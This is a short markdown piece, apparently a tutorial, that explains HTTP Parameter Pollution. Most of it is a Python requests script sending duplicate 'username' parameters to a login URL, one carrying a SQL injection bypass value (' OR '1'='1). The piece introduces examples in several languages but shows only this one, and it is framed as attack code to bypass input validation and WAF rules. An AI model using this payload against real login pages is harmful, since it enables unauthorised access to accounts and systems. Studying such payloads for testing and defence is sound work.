# HTTP Parameter Pollution (HPP) Exploitation Code

HTTP Parameter Pollution (HPP) occurs when multiple parameters with the same name are sent in an HTTP request, which can sometimes bypass input validation and WAF rules. Here are examples in different languages to demonstrate HPP attacks:

## Python (using requests library)

```python
import requests

# Target URL with vulnerable parameter
url = "https://example.com/login"

# Normal request
params = {
    'username': 'admin',
    'password': 'password123'
}

# HPP attack by sending duplicate parameters
hpp_params = {
    'username': ['admin', 'admin\' OR \'1\'=\'1'],  # Duplicate username parameter
    'password': 'password123'
}

# Send the request
response = requests.get(url, params=hpp_params)
print(response.url)  # Check the constructed URL
print(response.text)
```

